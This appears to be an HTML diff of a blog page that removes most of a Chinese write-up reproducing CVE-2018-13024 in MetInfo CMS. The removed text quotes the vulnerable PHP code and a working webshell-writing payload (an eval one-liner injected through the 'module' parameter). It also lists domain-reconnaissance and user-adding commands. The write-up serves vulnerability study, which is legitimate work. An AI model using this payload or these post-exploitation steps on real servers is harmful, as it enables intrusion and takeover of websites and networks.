@@ -162,7 +162,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/17/CVE-2018-13024/">CVE-2018-13024</a>
+      <a class="article-title" href="/2019/12/17/CVE-2018-13024/">&lt;font color=&#39;orange&#39;&gt;CVE-2018-13024&lt;/font&gt;</a>
     </h1>
   
 
@@ -175,43 +175,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="CVE-2018-13024"><a href="#CVE-2018-13024" class="headerlink" title="CVE-2018-13024"></a><font color="orange">CVE-2018-13024</font></h1><h2>0x00漏洞介绍</h2>
+        <h2>0x00漏洞介绍</h2>
 引言:MetInfo是中国米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。Metinfo 6.0.0版本中存在安全漏洞。远程攻击者可通过向admin/column/save.php文件发送‘module’参数利用该漏洞向.php文件写入代码并执行该代码。
-exp:该漏洞是metinfo5.3版本下的一个任意变量覆盖导致的任意文件上传，因而可以上传我们的一句话木马，并用蚁剑进行连接，在获取到了webshell的情况下，我们再对其进行简单的域信息收集，路由信息收集，然后对其进行简单的内网渗透。
-影响版本Metlnfo5.3.16&&Metln6.0.0
-
-<h2>0x01环境搭建,工具介绍</h2>
-攻击机:kali,windows10(本机)
-靶机:windows 2003 Enterprise Edition()
-tools:WIN10(firefox,蚁剑,远程连接)，kali(metasploit的msf5模块以及meterpreter进行域信息收集，密码破解等操作)
-
-<h2>0x02具体漏洞分析</h2>
-<h3>1.获取webshell</h3>
-该漏洞主要发生在metinfo5.3的\admin\column\save.php的column_copyconfig函数
-这里我们使用Seay源代码审计系统对代码进行审计，首先打开metinfo5.3作为项目，然后打开column下的save.php找到这个函数如下所示:
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">column_copyconfig($foldername,$module,$id);</span><br></pre></td></tr></table></figure>
-
-<p>我们对函数进行定位，这个原函数在\admin\column\global.func.php中，在这个函数中又调用了Copyindx函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyindx(ROOTPATH.$foldername.&apos;/index.php&apos;,$module);</span><br></pre></td></tr></table></figure>
-
-<p>再次定位该函数，这次在\admin\include\global.func.php中找到了该函数:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Copyindx($newindx,$type)&#123;</span><br><span class="line">	if(!file_exists($newindx))&#123;</span><br><span class="line">		$oldcont =&quot;&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once &apos;../include/module.php&apos;; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;&quot;;</span><br><span class="line">		$fp = fopen($newindx,w);</span><br><span class="line">		fputs($fp, $oldcont);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到该函数会复制一个index.php文件到调用它的地方，这里如果oldcont函数中的变量可控，然后再让该函数调用的话，那么就可以进行任意文件的写入，我们可以直接写入一句话木马。接下来对其中的变量进行探讨：<br>$fmodule=$type;最重要的就是这两个变量，其中$type是函数传入的，我们再看一下之前的column下的column_copyconfig文件中调用Copyindx使用的变量$module,因而只要改变$module变量的值，就可以导致我们写入想要的内容并在自己想要的路径下生成index.php.</p>
-<p>这里通过查询Metinfo的漏洞会发现它有一个经典的伪全局变量覆盖，在metinfo5.3\admin\include\common.inc.php中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $_key&#123;0&#125; != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value,0,0,1);</span><br><span class="line">        $_M[&apos;form&apos;][$_key]=daddslashes($_value,0,0,1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里我们可以直接传入get参数，覆盖掉$module变量，将其变为一句话内容。<br>payload构造:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:admin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;@eval($_POST[a]);/*</span><br></pre></td></tr></table></figure>
-
-<p>这里需要注意一下post里面写的a而不是’a’,这是因为这个变量覆盖模块对传入的变量进行了daddslashes处理，所有传入的引号都会加上\进行转义，这样会导致一句话连接不上，并且该文件写入只能写入一次，一旦出错，就写入不了任何文件了，因而，必须在本地构造好。<br>Notice：这个漏洞必须在admin权限下才可以执行，因而第一步应当登入admin后台，这里由于复现主要内容是对于内网渗透的简单学习，故之前的webshell粗糙一点，进行弱口令爆破admin,登录admin后台。<br>在payload输入后，使用蚁剑进行连接，这里我们传入的foldername即为路径，故shell在upload下的index.php.<br>连接后打开命令提示行输入:whoami,会显示已经是administrator权限了，故不用提权了，接下来进行域信息收集。</p>
-<h3>2.进行域信息收集</h3>
-
-<p>这里我个人觉得直接使用蚁剑的命令行即可获取大量的域信息，例如路由信息等。<br>这里通过百度可以得到许多windows下的命令进行域信息收集。就写在这里了:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all                         查看本机的ip段</span><br><span class="line"></span><br><span class="line">net user                               查看本地用户列表</span><br><span class="line"></span><br><span class="line">net user /domain                查看域用户</span><br><span class="line"></span><br><span class="line">net view /domain                查看内网存在多少域</span><br><span class="line"></span><br><span class="line">net group /domain             查看域有哪些组</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain    查看域管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators /domain         查看域管理员</span><br><span class="line"></span><br><span class="line">net user username password /add /domain      添加域用户</span><br><span class="line"></span><br><span class="line">net localgroup administrators workgroup\test123 /add         添加域用户 (权限不够是加不了的)</span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain                    查看所有域控</span><br><span class="line"></span><br><span class="line">net time /domain           判断主域，一般的主域都是会做时间服务器这种骚操作的</span><br><span class="line"></span><br><span class="line">net view /domain           查询域列表</span><br><span class="line"></span><br><span class="line">net view \\ip                   查询某个ip的共享</span><br><span class="line"></span><br><span class="line">net view                          查询同域的机器</span><br><span class="line"></span><br><span class="line">net accounts  /domain                 查询域密码策略</span><br><span class="line"></span><br><span class="line">whoami /all                                  查询用户的权限</span><br><span class="line"></span><br><span class="line">ping 域名称                                   获取域服务器的ip</span><br><span class="line"></span><br><span class="line">nbtstat -a 域名称                            获取域服务器的ip</span><br><span class="line"></span><br><span class="line">dsquery computer                      查看域里的计算机</span><br><span class="line"></span><br><span class="line">dsquery contact                           查看域里的联系人</span><br><span class="line"></span><br><span class="line">dsquery group                              查看域里的用户组</span><br><span class="line"></span><br><span class="line">dsquery user                                 查看域用户</span><br><span class="line"></span><br><span class="line">dsquery subnet                             查看网段的划分</span><br><span class="line"></span><br><span class="line">dsquery server                              显示所有域控</span><br><span class="line"></span><br><span class="line">dsquery subnet                             查看域里的子网</span><br></pre></td></tr></table></figure>
-
-<p>这里的域信息收集可以直接使用这些命令，当然使用msf下的命令能收集到更多内容，于是我们使用msf生成一个后门文件。<br><h><br>本文参考文章：<a href="https://www.freebuf.com/news/193748.html" target="_blank" rel="noopener">https://www.freebuf.com/news/193748.html</a></h></p>
-
+        
+          <a class="article-more-a" href="/2019/12/17/CVE-2018-13024/#more">more >></a>
+        
       
 
       
